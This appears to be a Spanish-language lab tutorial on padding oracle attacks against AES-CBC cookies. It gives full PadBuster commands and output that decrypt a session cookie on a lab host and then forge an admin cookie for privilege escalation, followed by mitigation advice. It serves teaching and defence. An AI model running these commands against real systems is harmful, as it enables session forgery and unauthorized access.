
---
# Ataque de Oráculo de Relleno (Padding Oracle Attack)

## ¿Qué es un ataque de oráculo de relleno?

Un **Padding Oracle Attack** es una técnica criptográfica utilizada por atacantes para **descifrar mensajes cifrados** sin conocer la clave secreta. Aprovecha la forma en que algunas aplicaciones manejan el relleno de datos cifrados con algoritmos como AES en modo **CBC (Cipher Block Chaining)**.

### Conceptos clave:

- **Oráculo**: Un sistema que indica si un descifrado es válido (por ejemplo, con un mensaje de error como “relleno incorrecto” o con diferentes tiempos de respuesta).
- **Relleno (Padding)**: Dado que muchos algoritmos de cifrado de bloque requieren que los datos tengan una longitud múltiplo del tamaño de bloque (por ejemplo, 8 o 16 bytes), se agregan bytes adicionales al final del mensaje.
- **CBC**: Modo de operación donde cada bloque cifrado depende del bloque anterior. Esto introduce dependencia entre bloques y, por tanto, vulnerabilidades si no se implementa correctamente.

---

## Herramienta: PadBuster

**PadBuster** automatiza este tipo de ataques para mensajes cifrados en CBC con relleno PKCS#7. La herramienta:

- Envía bloques cifrados modificados al servidor.
- Analiza las respuestas (códigos HTTP, mensajes de error, tiempos de respuesta).
- Determina qué relleno es válido.
- Descifra el mensaje byte a byte.

---

## Ejemplo práctico de uso de PadBuster

### Escenario:

Un servidor web expone un parámetro `auth` en una cookie que contiene un token cifrado en modo CBC.

El token es:
```

ycGAxjRY6cQCreynFuWRD1hrX3k9Xr66

````

El objetivo es descifrar el contenido de este token **sin tener la clave**, aprovechando que el servidor responde con mensajes de error diferentes dependiendo de si el relleno es válido o no.

---

### Comando:

```bash
padbuster http://192.168.1.60/index.php ycGAxjRY6cQCreynFuWRD1hrX3k9Xr66 8 -cookies "auth=ycGAxjRY6cQCreynFuWRD1hrX3k9Xr66"
````

### Explicación de cada parámetro:

|Parámetro|Descripción|
|---|---|
|`http://192.168.1.60/index.php`|URL del objetivo vulnerable.|
|`ycGAxjRY6cQCreynFuWRD1hrX3k9Xr66`|Token cifrado (en base64 o hexadecimal).|
|`8`|Tamaño del bloque de cifrado en bytes. Comúnmente 8 o 16 según el algoritmo.|
|`-cookies`|Parámetro para indicar que el token se envía en una cookie.|
|`"auth=..."`|Cookie donde se encuentra el token. PadBuster reemplazará este valor con versiones modificadas para el ataque.|

---

### ¿Qué hace PadBuster?

1. Divide el token en bloques de 8 bytes (en este caso).
    
2. Genera combinaciones byte por byte del penúltimo bloque.
    
3. Envía esas combinaciones al servidor.
    
4. Analiza si el servidor devuelve un mensaje de “relleno válido”.
    
5. Deduce el byte correcto del texto en claro.
    
6. Repite hasta descifrar todo el mensaje.
    

---

## Resultado esperado

PadBuster mostrará algo como:

```
Block 1 Results:
[+] Byte 1: 0x41 (A)
[+] Byte 2: 0x64 (d)
...
Decrypted Block: 'Admin=1&user=pedro'
```

```bash
+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 1192

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 2 ***

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#	Freq	Status	Length	Location
-------------------------------------------------------
1	1	200	1388	N/A
2 **	255	200	15	N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (79/256) [Byte 8]
[+] Success: (114/256) [Byte 7]
[+] Success: (202/256) [Byte 6]
[+] Success: (243/256) [Byte 5]
[+] Success: (79/256) [Byte 4]
[+] Success: (29/256) [Byte 3]
[+] Success: (75/256) [Byte 2]
[+] Success: (76/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): 02adeca716e5910f
[+] Intermediate Bytes (HEX): bcb2e5b409358cb0
[+] Plain Text: user=met

Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, <STDIN> line 1.
*** Starting Block 2 of 2 ***

[+] Success: (243/256) [Byte 8]
[+] Success: (112/256) [Byte 7]
[+] Success: (27/256) [Byte 6]
[+] Success: (131/256) [Byte 5]
[+] Success: (49/256) [Byte 4]
[+] Success: (97/256) [Byte 3]
[+] Success: (62/256) [Byte 2]
[+] Success: (149/256) [Byte 1]

Block 2 Results:
[+] Cipher Text (HEX): 586b5f793d5ebeba
[+] Intermediate Bytes (HEX): 63c599ca79e6920c
[+] Plain Text: ahumo

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): user=metahumo

[+] Decrypted value (HEX): 757365723D6D65746168756D6F030303

[+] Decrypted value (Base64): dXNlcj1tZXRhaHVtbwMDAw==
```

Esto significa que el token cifrado contenía credenciales o información sensible como el rol de un usuario.

---

## Ejemplo real

En 2010, una vulnerabilidad en ASP.NET permitió a atacantes usar un oráculo de relleno para extraer archivos protegidos del servidor. Microsoft tuvo que emitir un parche de seguridad crítico. Este ataque fue posible gracias a los mensajes de error detallados que revelaban si el relleno era correcto.

---

## Mitigación recomendada

- **No revelar errores detallados** al validar datos cifrados.
    
- Utilizar **HMAC** o autenticación de mensajes antes del descifrado.
    
- Validar el HMAC **antes** de descifrar cualquier dato.
    
- Comparar firmas HMAC con **comparaciones de tiempo constante**.
    

---

## Referencias y herramientas

- [PadBuster - GitHub (forks y mirrors)](https://github.com/AonCyberLabs/PadBuster)
    
- Artículo sobre CBC y padding oracle: [https://robertheaton.com/2013/07/29/padding-oracle-attack/](https://robertheaton.com/2013/07/29/padding-oracle-attack/)
    

---

## Para encriptar una elevación de privilegios

```bash
padbuster http://192.168.1.60/index.php ycGAxjRY6cQCreynFuWRD1hrX3k9Xr66 8 -cookies "auth=ycGAxjRY6cQCreynFuWRD1hrX3k9Xr66" -plaintext "user=admin"
```

Explicación: como previamente hemos desencriptado la cookie y sabemos su estructura, ahora le pedimos que nos pase un encriptado de un usuario administrador

Resultado:

```bash
+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 1192

INFO: Starting PadBuster Encrypt Mode
[+] Number of Blocks: 2

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#	Freq	Status	Length	Location
-------------------------------------------------------
1	1	200	1388	N/A
2 **	255	200	15	N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (196/256) [Byte 8]
[+] Success: (148/256) [Byte 7]
[+] Success: (92/256) [Byte 6]
[+] Success: (41/256) [Byte 5]
[+] Success: (218/256) [Byte 4]
[+] Success: (136/256) [Byte 3]
[+] Success: (150/256) [Byte 2]
[+] Success: (190/256) [Byte 1]

Block 2 Results:
[+] New Cipher Text (HEX): 23037825d5a1683b
[+] Intermediate Bytes (HEX): 4a6d7e23d3a76e3d

[+] Success: (1/256) [Byte 8]
[+] Success: (36/256) [Byte 7]
[+] Success: (180/256) [Byte 6]
[+] Success: (17/256) [Byte 5]
[+] Success: (146/256) [Byte 4]
[+] Success: (50/256) [Byte 3]
[+] Success: (132/256) [Byte 2]
[+] Success: (135/256) [Byte 1]

Block 1 Results:
[+] New Cipher Text (HEX): 0408ad19d62eba93
[+] Intermediate Bytes (HEX): 717bc86beb4fdefe

-------------------------------------------------------
** Finished ***

[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
-------------------------------------------------------
```

Explicación: tenemos una posible cookie de sesión válida como usuario admin: `BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA`